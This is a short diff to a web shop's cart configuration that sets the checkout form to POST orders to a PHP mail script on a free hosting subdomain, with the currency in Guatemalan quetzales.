@@ -58,7 +58,7 @@
              cartStyle: "table",
              checkout:{ 
                  type: "SendForm", 
-                 url:"/*error_php*/",
+                 url:"sntmail.000webhostapp.com/c1a22r333r4444i55555t666666o7777777.php",
                  method: "POST", },
 
 					currency				: "GTQ",
